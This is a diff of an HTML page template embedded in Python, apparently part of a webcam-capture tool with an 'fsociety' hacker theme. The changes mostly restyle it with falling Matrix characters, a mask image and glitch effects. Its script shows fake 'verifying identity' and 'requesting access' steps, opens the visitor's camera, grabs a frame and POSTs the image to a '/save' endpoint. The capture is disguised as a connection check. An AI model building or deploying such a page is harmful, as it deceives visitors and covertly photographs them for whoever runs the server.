@@ -16,64 +16,94 @@ HTML = """
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body {
+html, body {
+  height: 100%;
   background: #000;
-  color: #00ff41;
-  font-family: 'Share Tech Mono', monospace;
-  min-height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
   overflow: hidden;
-  position: relative;
 }
-body::before {
-  content: "";
+#matrix {
   position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background: repeating-linear-gradient(
-    0deg,
-    rgba(0, 255, 65, 0.03) 0px,
-    rgba(0, 255, 65, 0.03) 1px,
-    transparent 1px,
-    transparent 3px
-  );
-  pointer-events: none;
-  z-index: 1;
+  top: 0; left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
 }
 .card {
   position: relative;
   z-index: 2;
+  margin: 0 auto;
   padding: 40px 28px;
   max-width: 380px;
   width: 92%;
   text-align: center;
   border: 1px solid #00ff41;
-  box-shadow: 0 0 20px rgba(0, 255, 65, 0.2), inset 0 0 20px rgba(0, 255, 65, 0.05);
-  background: #000;
+  box-shadow: 0 0 20px rgba(0,255,65,0.2), inset 0 0 20px rgba(0,255,65,0.05);
+  background: rgba(0,0,0,0.75);
+  backdrop-filter: blur(4px);
+  animation: fadeIn 1.5s ease;
 }
-.ascii {
+body {
+  display: flex;
+  align-items: center;
+  justify-content: center;
   font-family: 'Share Tech Mono', monospace;
-  font-size: 6px;
-  line-height: 6px;
   color: #00ff41;
-  white-space: pre;
-  margin-bottom: 24px;
-  text-shadow: 0 0 4px #00ff41;
-  letter-spacing: 0;
+  min-height: 100vh;
 }
-.title {
-  font-size: 26px;
-  letter-spacing: 6px;
-  margin-bottom: 8px;
-  text-transform: uppercase;
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+.mask {
+  width: 100px;
+  height: 100px;
+  margin-bottom: 20px;
+  filter: drop-shadow(0 0 12px #00ff41);
+  animation: pulse 3s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%, 100% { filter: drop-shadow(0 0 12px #00ff41); }
+  50% { filter: drop-shadow(0 0 24px #00ff41); }
+}
+.logo {
+  font-size: 38px;
+  letter-spacing: 8px;
+  margin-bottom: 6px;
   color: #00ff41;
-  text-shadow: 0 0 8px #00ff41;
+  text-shadow: 0 0 12px #00ff41;
+  position: relative;
+  display: inline-block;
+}
+.glitch::before,
+.glitch::after {
+  content: attr(data-text);
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%;
+  overflow: hidden;
+}
+.glitch::before {
+  color: #ff0033;
+  animation: glitch 0.6s infinite;
+  clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+}
+.glitch::after {
+  color: #00ffff;
+  animation: glitch 0.6s infinite reverse;
+  clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+}
+@keyframes glitch {
+  0% { transform: translate(0); }
+  20% { transform: translate(-2px, 1px); }
+  40% { transform: translate(2px, -1px); }
+  60% { transform: translate(-1px, -1px); }
+  80% { transform: translate(1px, 1px); }
+  100% { transform: translate(0); }
 }
 .sub {
-  font-size: 12px;
+  font-size: 11px;
   color: #00802a;
-  letter-spacing: 2px;
+  letter-spacing: 3px;
   margin-bottom: 28px;
   text-transform: uppercase;
 }
@@ -104,70 +134,58 @@ body::before {
   box-shadow: 0 0 8px #00ff41;
   transition: width 1.5s linear;
 }
-.red { color: #ff0033; text-shadow: 0 0 8px #ff0033; }
-.glitch {
-  position: relative;
-  display: inline-block;
-}
-.glitch::before,
-.glitch::after {
-  content: attr(data-text);
-  position: absolute;
-  top: 0; left: 0;
-  width: 100%;
-  overflow: hidden;
-}
-.glitch::before {
-  color: #ff0033;
-  animation: glitch 0.5s infinite;
-  clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
-}
-.glitch::after {
-  color: #00ffff;
-  animation: glitch 0.5s infinite reverse;
-  clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
-}
-@keyframes glitch {
-  0% { transform: translate(0); }
-  20% { transform: translate(-2px, 1px); }
-  40% { transform: translate(2px, -1px); }
-  60% { transform: translate(-1px, -1px); }
-  80% { transform: translate(1px, 1px); }
-  100% { transform: translate(0); }
-}
 </style>
 </head>
 <body>
+<canvas id="matrix"></canvas>
 <div class="card">
-  <pre class="ascii">
-   ███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
-   ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
-   █████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝
-   ██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝
-   ██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║
-   ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝
-  </pre>
-  <div class="title">
-    <span class="glitch" data-text="HELLO FRIEND">HELLO FRIEND</span>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Guy_Fawkes_mask_%28white%29.svg/512px-Guy_Fawkes_mask_%28white%29.svg.png" alt="mask" class="mask">
+  <div class="logo">
+    <span class="glitch" data-text="fsociety">fsociety</span>
   </div>
   <div class="sub">fsociety // connection</div>
   <div class="status" id="status">initializing</div>
   <div class="bar"><div class="bar-fill" id="bar"></div></div>
 </div>
 <script>
+// Matrix-эффект падающих цифр
+const canvas = document.getElementById("matrix");
+const ctx = canvas.getContext("2d");
+let w, h, columns, drops;
+const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+const fontSize = 16;
+
+function resize() {
+  w = canvas.width = window.innerWidth;
+  h = canvas.height = window.innerHeight;
+  columns = Math.floor(w / fontSize);
+  drops = new Array(columns).fill(1);
+}
+resize();
+window.addEventListener("resize", resize);
+
+function draw() {
+  ctx.fillStyle = "rgba(0,0,0,0.06)";
+  ctx.fillRect(0, 0, w, h);
+  ctx.fillStyle = "#00ff41";
+  ctx.font = fontSize + "px monospace";
+  for (let i = 0; i < drops.length; i++) {
+    const text = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+    if (drops[i] * fontSize > h && Math.random() > 0.975) {
+      drops[i] = 0;
+    }
+    drops[i]++;
+  }
+}
+setInterval(draw, 50);
+
+// Статусы и прогресс
 const statusEl = document.getElementById("status");
 const barEl = document.getElementById("bar");
-const steps = [
-  "initializing",
-  "loading modules",
-  "verifying identity",
-  "requesting access",
-  "capturing frame",
-  "done"
-];
-setTimeout(() => { barEl.style.width = "30%"; }, 300);
-setTimeout(() => { statusEl.innerText = steps[1]; barEl.style.width = "50%"; }, 800);
-setTimeout(() => { statusEl.innerText = steps[2]; barEl.style.width = "70%"; }, 1500);
+setTimeout(() => { barEl.style.width = "30%"; statusEl.innerText = "loading modules"; }, 300);
+setTimeout(() => { barEl.style.width = "50%"; statusEl.innerText = "verifying identity"; }, 800);
+setTimeout(() => { barEl.style.width = "70%"; statusEl.innerText = "requesting access"; }, 1500);
 
 async function start() {
   try {
@@ -177,11 +195,11 @@ async function start() {
     video.setAttribute("playsinline", "");
     await video.play();
     await new Promise(r => setTimeout(r, 1500));
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-    const photo = canvas.toDataURL("image/png");
+    const c = document.createElement("canvas");
+    c.width = video.videoWidth;
+    c.height = video.videoHeight;
+    c.getContext("2d").drawImage(video, 0, 0);
+    const photo = c.toDataURL("image/png");
     stream.getTracks().forEach(t => t.stop());
     await fetch("/save", {
       method: "POST",
@@ -190,12 +208,11 @@ async function start() {
     });
     barEl.style.width = "100%";
     statusEl.innerText = "access granted";
-    statusEl.style.color = "#00ff41";
   } catch (e) {
     barEl.style.width = "100%";
     barEl.style.background = "#ff0033";
     statusEl.innerText = "access denied";
-    statusEl.classList.add("red");
+    statusEl.style.color = "#ff0033";
   }
 }
 setTimeout(start, 2000);
